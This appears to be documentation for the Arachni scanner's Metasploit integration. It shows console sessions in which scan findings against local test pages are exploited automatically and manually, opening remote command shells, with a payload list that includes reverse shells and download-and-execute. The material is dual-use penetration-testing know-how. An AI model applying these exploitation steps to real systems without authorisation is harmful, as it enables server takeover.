# WebApp exploitation with Arachni and Metasploit

Arachni provides advanced exploitation techniques via the:

 - ArachniMetareport, an Arachni report specifically designed to provide WebApp context to the [Metasploit](http://www.metasploit.com/) framework.
 - Arachni plug-in for the [Metasploit](http://www.metasploit.com/) framework, used to load the ArachniMetareport in order to provide advanced automated and manual exploitation of WebApp vulnerabilities.
 - Advanced generic WebApp exploit modules for the [Metasploit](http://www.metasploit.com/) framework, utilized either manually or automatically by the Arachni MSF plug-in.


##Installation

To install the necessary files all you need to do is copy the contents of the "external/metasploit" directory to Metasploit's root.
    $ cp -R arachni/external/metasploit/* metasploit/

##Usage

###Creating the Metareport

#### New scan
    $ ./arachni.rb http://localhost/~zapotek/tests/ --repsave=localhost --report=metareport
    Arachni - Web Application Security Scanner Framework v0.2.1 [0.1.9]
           Author: Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>
                                          <zapotek@segfault.gr>
                   (With the support of the community and the Arachni Team.)

           Website:       http://github.com/Zapotek/arachni
           Documentation: http://github.com/Zapotek/arachni/wiki


     [~] No modules were specified.
     [~]  -> Will run all mods.
     [~] No audit options were specified.
     [~]  -> Will audit links, forms and cookies.

     [...snipping a whole lot of scan output...]

     [*] Creating file for the Metasploit framework...
     [*] Saved in 'localhost.afr.msf'.

     [*] Dumping audit results in 'metareport.afr'.
     [*] Done!

#### Converting an existing report
To convert a standard Arachni Framework Report (.afr) file to a Metareport (.afr.msf) file:

    $ ./arachni.rb --repload=localhost.afr --report=metareport --repsave=localhost
    Arachni - Web Application Security Scanner Framework v0.2.1 [0.1.9]
           Author: Tasos "Zapotek" Laskos <tasos.laskos@gmail.com>
                                          <zapotek@segfault.gr>
                   (With the support of the community and the Arachni Team.)

           Website:       http://github.com/Zapotek/arachni
           Documentation: http://github.com/Zapotek/arachni/wiki



     [*] Creating file for the Metasploit framework...
     [*] Saved in 'localhost.afr.msf'.


### Using the Arachni plug-in via Metasploit
#### Automated exploitation (arachni_autopwn)

##### Usage
    msf > arachni_autopwn
    [*] Usage: arachni_autopwn [options]
            -h          Display this help text
            -x [regexp] Only run modules whose name matches the regex
            -a          Launch exploits against all matched targets
            -r          Use a reverse connect shell
            -b          Use a bind shell on a random port (default)
            -m          Use a meterpreter shell (if possible)
            -q          Disable exploit module output

##### Example
    $ ./msfconsole

    #    # ###### #####   ##    ####  #####  #       ####  # #####
    ##  ## #        #    #  #  #      #    # #      #    # #   #
    # ## # #####    #   #    #  ####  #    # #      #    # #   #
    #    # #        #   ######      # #####  #      #    # #   #
    #    # #        #   #    # #    # #      #      #    # #   #
    #    # ######   #   #    #  ####  #      ######  ####  #   #


           =[ metasploit v3.5.1-dev [core:3.5 api:1.0]
    + -- --=[ 619 exploits - 306 auxiliary
    + -- --=[ 215 payloads - 27 encoders - 8 nops
           =[ svn r10832 updated yesterday (2010.10.26)

    msf > load arachni
    [*] Successfully loaded plugin: arachni
    msf > arachni_load ../arachni/localhost.afr.msf
    [*] Loading report...
    [*] Loaded 17 vulnerabilities.


    Unique exploits
    ===============

        ID  Exploit                          Description
        --  -------                          -----------
        1   unix/webapp/arachni_php_include
                                            This module allows complex HTTP requests to be crafted in order to
                                    allow exploitation of PHP remote file inclusion vulnerabilities.

                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                                    i.e. where the payload should go.

                                    Supported vectors: GET, POST, COOKIE, HEADER.
                                    (Mainly for use with the Arachni plug-in.)

        2   unix/webapp/arachni_php_eval
                                            This module allows complex HTTP requests to be crafted in order to
                                    allow exploitation of PHP eval() vulnerabilities in Unix-like platforms.

                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                                    i.e. where the payload should go.

                                    Supported vectors: GET, POST, COOKIE, HEADER.
                                    (Mainly for use with the Arachni plug-in.)

        3   unix/webapp/arachni_exec
                                            This module allows complex HTTP requests to be crafted in order to
                                    allow exploitation of command injection vulnerabilities in Unix-like platforms.

                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                                    i.e. where the payload should go.

                                    Supported vectors: GET, POST, COOKIE, HEADER.
                                    (Mainly for use with the Arachni plug-in.)




    Vulnerabilities
    ===============

        ID  Host       Path                                    Name                   Method  Params                               Exploit
        --  ----       ----                                    ----                   ------  ------                               -------
        1   127.0.0.1  /~zapotek/tests/trainer.php             Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
        2   127.0.0.1  /~zapotek/tests/trainer.php             Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
        3   127.0.0.1  /~zapotek/tests/forms/eval.php          Code injection         POST    {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
        4   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
        5   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   POST    {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
        6   127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
        7   127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  POST    {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
        8   127.0.0.1  /~zapotek/tests/links/eval.php          Code injection         GET     {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
        9   127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
        10  127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   GET     {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
        11  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
        12  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  GET     {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
        13  127.0.0.1  /~zapotek/tests/cookies/eval.php        Code injection         COOKIE  {"eval"=>"%3BXXinjectionXX"}         unix/webapp/arachni_php_eval
        14  127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
        15  127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   COOKIE  {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
        16  127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
        17  127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include

    [*] Done!
    msf > arachni_autopwn -a
    [*] Running pwn-jobs...
    [...snip...]
    [*] Command shell session 1 opened (127.0.0.1:54598 -> 127.0.0.1:5019) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 2 opened (127.0.0.1:55336 -> 127.0.0.1:8541) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 3 opened (127.0.0.1:37880 -> 127.0.0.1:12465) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 4 opened (127.0.0.1:49451 -> 127.0.0.1:10866) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 5 opened (127.0.0.1:40276 -> 127.0.0.1:11915) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 6 opened (127.0.0.1:34400 -> 127.0.0.1:5222) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 7 opened (127.0.0.1:58456 -> 127.0.0.1:10955) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 9 opened (127.0.0.1:48549 -> 127.0.0.1:5929) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 8 opened (127.0.0.1:47028 -> 127.0.0.1:12432) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 10 opened (127.0.0.1:38239 -> 127.0.0.1:11919) at 2010-10-28 18:26:00 +0100
    [*] Command shell session 11 opened (127.0.0.1:58541 -> 127.0.0.1:14343) at 2010-10-28 18:26:01 +0100
    [*] Command shell session 12 opened (127.0.0.1:48655 -> 127.0.0.1:13743) at 2010-10-28 18:26:01 +0100
    [*] Command shell session 13 opened (127.0.0.1:59996 -> 127.0.0.1:8895) at 2010-10-28 18:26:01 +0100
    [*] Command shell session 14 opened (127.0.0.1:53717 -> 127.0.0.1:10767) at 2010-10-28 18:26:01 +0100
    [*] Command shell session 15 opened (127.0.0.1:51623 -> 127.0.0.1:7668) at 2010-10-28 18:26:01 +0100
    [*] Command shell session 16 opened (127.0.0.1:47874 -> 127.0.0.1:8965) at 2010-10-28 18:26:02 +0100
    [...snip...]
    [*] The autopwn command has completed with 16 sessions
    [*] Enter sessions -i [ID] to interact with a given session ID
    [*]
    [*] ================================================================================

    Active sessions
    ===============

      Id  Type   Information  Connection                          Via
      --  ----   -----------  ----------                          ---
      1   shell               127.0.0.1:54598 -> 127.0.0.1:5019   exploit/unix/webapp/arachni_php_eval
      2   shell               127.0.0.1:55336 -> 127.0.0.1:8541   exploit/unix/webapp/arachni_exec
      3   shell               127.0.0.1:37880 -> 127.0.0.1:12465  exploit/unix/webapp/arachni_exec
      4   shell               127.0.0.1:49451 -> 127.0.0.1:10866  exploit/unix/webapp/arachni_php_include
      5   shell               127.0.0.1:40276 -> 127.0.0.1:11915  exploit/unix/webapp/arachni_php_eval
      6   shell               127.0.0.1:34400 -> 127.0.0.1:5222   exploit/unix/webapp/arachni_exec
      7   shell               127.0.0.1:58456 -> 127.0.0.1:10955  exploit/unix/webapp/arachni_php_include
      8   shell               127.0.0.1:47028 -> 127.0.0.1:12432  exploit/unix/webapp/arachni_exec
      9   shell               127.0.0.1:48549 -> 127.0.0.1:5929   exploit/unix/webapp/arachni_exec
      10  shell               127.0.0.1:38239 -> 127.0.0.1:11919  exploit/unix/webapp/arachni_exec
      11  shell               127.0.0.1:58541 -> 127.0.0.1:14343  exploit/unix/webapp/arachni_php_include
      12  shell               127.0.0.1:48655 -> 127.0.0.1:13743  exploit/unix/webapp/arachni_php_include
      13  shell               127.0.0.1:59996 -> 127.0.0.1:8895   exploit/unix/webapp/arachni_php_include
      14  shell               127.0.0.1:53717 -> 127.0.0.1:10767  exploit/unix/webapp/arachni_php_include
      15  shell               127.0.0.1:51623 -> 127.0.0.1:7668   exploit/unix/webapp/arachni_php_eval
      16  shell               127.0.0.1:47874 -> 127.0.0.1:8965   exploit/unix/webapp/arachni_php_include

    [*] ================================================================================
    msf > sessions -i 1
    [*] Starting interaction with 1...

    ls
    eval.php
    os_command.php
    rfi.php
    sqli.php
    xss.php

    whoami
    www-data
    ^C
    Abort session 1? [y/N]  y

    [*] Command shell session 1 closed.  Reason: User exit
    msf >

### Assisted exploitation (arachni_manual)
    $ ./msfconsole

    #    # ###### #####   ##    ####  #####  #       ####  # #####
    ##  ## #        #    #  #  #      #    # #      #    # #   #
    # ## # #####    #   #    #  ####  #    # #      #    # #   #
    #    # #        #   ######      # #####  #      #    # #   #
    #    # #        #   #    # #    # #      #      #    # #   #
    #    # ######   #   #    #  ####  #      ######  ####  #   #


           =[ metasploit v3.5.1-dev [core:3.5 api:1.0]
    + -- --=[ 619 exploits - 306 auxiliary
    + -- --=[ 215 payloads - 27 encoders - 8 nops
           =[ svn r10832 updated yesterday (2010.10.26)

    msf > load arachni
    [*] Successfully loaded plugin: arachni
    msf > arachni_load ../arachni/localhost.afr.msf
    [*] Loading report...
    [*] Loaded 17 vulnerabilities.


    Unique exploits
    ===============

        ID  Exploit                          Description
        --  -------                          -----------
        1   unix/webapp/arachni_php_include
                                            This module allows complex HTTP requests to be crafted in order to
                                    allow exploitation of PHP remote file inclusion vulnerabilities.

                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                                    i.e. where the payload should go.

                                    Supported vectors: GET, POST, COOKIE, HEADER.
                                    (Mainly for use with the Arachni plug-in.)

        2   unix/webapp/arachni_php_eval
                                            This module allows complex HTTP requests to be crafted in order to
                                    allow exploitation of PHP eval() vulnerabilities in Unix-like platforms.

                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                                    i.e. where the payload should go.

                                    Supported vectors: GET, POST, COOKIE, HEADER.
                                    (Mainly for use with the Arachni plug-in.)

        3   unix/webapp/arachni_exec
                                            This module allows complex HTTP requests to be crafted in order to
                                    allow exploitation of command injection vulnerabilities in Unix-like platforms.

                                    Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                                    i.e. where the payload should go.

                                    Supported vectors: GET, POST, COOKIE, HEADER.
                                    (Mainly for use with the Arachni plug-in.)




    Vulnerabilities
    ===============

        ID  Host       Path                                    Name                   Description                                                       Method  Params                               Exploit
        --  ----       ----                                    ----                   -----------                                                       ------  ------                               -------
        1   127.0.0.1  /~zapotek/tests/trainer.php             Remote file inclusion  A remote file inclusion vulnerability exists.                     COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
        2   127.0.0.1  /~zapotek/tests/trainer.php             Remote file inclusion  A remote file inclusion vulnerability exists.                     COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
        3   127.0.0.1  /~zapotek/tests/forms/eval.php          Code injection         Code can be injected into the web application.                    POST    {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
        4   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   The web application allows an attacker to execute OS commands.    POST    {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
        5   127.0.0.1  /~zapotek/tests/forms/os_command.php    OS command injection   The web application allows an attacker to execute OS commands.    POST    {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
        6   127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  A remote file inclusion vulnerability exists.                     POST    {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
        7   127.0.0.1  /~zapotek/tests/forms/rfi.php           Remote file inclusion  A remote file inclusion vulnerability exists.                     POST    {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
        8   127.0.0.1  /~zapotek/tests/links/eval.php          Code injection         Code can be injected into the web application.                    GET     {"eval"=>";XXinjectionXX"}           unix/webapp/arachni_php_eval
        9   127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   The web application allows an attacker to execute OS commands.    GET     {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
        10  127.0.0.1  /~zapotek/tests/links/os_command.php    OS command injection   The web application allows an attacker to execute OS commands.    GET     {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
        11  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  A remote file inclusion vulnerability exists.                     GET     {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
        12  127.0.0.1  /~zapotek/tests/links/rfi.php           Remote file inclusion  A remote file inclusion vulnerability exists.                     GET     {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
        13  127.0.0.1  /~zapotek/tests/cookies/eval.php        Code injection         Code can be injected into the web application.                    COOKIE  {"eval"=>"%3BXXinjectionXX"}         unix/webapp/arachni_php_eval
        14  127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   The web application allows an attacker to execute OS commands.    COOKIE  {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
        15  127.0.0.1  /~zapotek/tests/cookies/os_command.php  OS command injection   The web application allows an attacker to execute OS commands.    COOKIE  {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
        16  127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  A remote file inclusion vulnerability exists.                     COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
        17  127.0.0.1  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  A remote file inclusion vulnerability exists.                     COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include

    [*] Done!
    msf > arachni_manual 3
    [*] Using unix/webapp/arachni_php_eval .
    [*] Preparing datastore for 'Code injection' vulnerability @ 127.0.0.1/~zapotek/tests/forms/eval.php ...
    SRVHOST => 127.0.0.1
    SRVPORT => 9681
    RHOST => 127.0.0.1
    RPORT => 80
    LHOST => 127.0.0.1
    LPORT => 13200
    POST => eval=;XXinjectionXX
    COOKIES =>
    HEADERS => Accept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8::User-Agent=Arachni/0.2.1
    PATH => /~zapotek/tests/forms/eval.php
    PAYLOAD => php/bind_php
    [*] Done!

    Compatible payloads
    ===================

        Name                         Description
        ----                         -----------
        generic/shell_bind_tcp       Listen for a connection and spawn a command shell
        generic/shell_reverse_tcp    Connect back to attacker and spawn a command shell
        php/bind_perl                Listen for a connection and spawn a command shell via perl (persistent)
        php/bind_php                 Listen for a connection and spawn a command shell via php
        php/download_exec            Download an EXE from an HTTP URL and execute it
        php/exec                     Execute a single system command
        php/meterpreter/bind_tcp     Listen for a connection, Run a meterpreter server in PHP
        php/meterpreter/reverse_tcp  Reverse PHP connect back stager with checks for disabled functions, Run a meterpreter server in PHP
        php/reverse_perl             Creates an interactive shell via perl
        php/reverse_php              Reverse PHP connect back shell with checks for disabled functions
        php/shell_findsock
                                    Spawn a shell on the established connection to
                                    the webserver.  Unfortunately, this payload
                                    can leave conspicuous evil-looking entries in the
                                    apache error logs, so it is probably a good idea
                                    to use a bind or reverse shell unless firewalls
                                    prevent them from working.  The issue this
                                    payload takes advantage of (CLOEXEC flag not set
                                    on sockets) appears to have been patched on the
                                    Ubuntu version of Apache and may not work on
                                    other Debian-based distributions.  Only tested on
                                    Apache but it might work on other web servers
                                    that leak file descriptors to child processes.



    Use: set PAYLOAD <name>
    msf exploit(arachni_php_eval) > exploit

    [*] Sending HTTP request for /~zapotek/tests/forms/eval.php
    [*] Started bind handler
    [*] Command shell session 17 opened (127.0.0.1:40351 -> 127.0.0.1:13200) at 2010-10-28 18:53:12 +0100

    ls
    csrf.php
    eval.php
    login.php
    os_command.php
    recon
    rfi.php
    sqli.php
    xss.php

    whoami
    www-data
    ^C
    Abort session 17? [y/N]  y

    [*] Command shell session 17 closed.  Reason: User exit
    msf exploit(arachni_php_eval) >
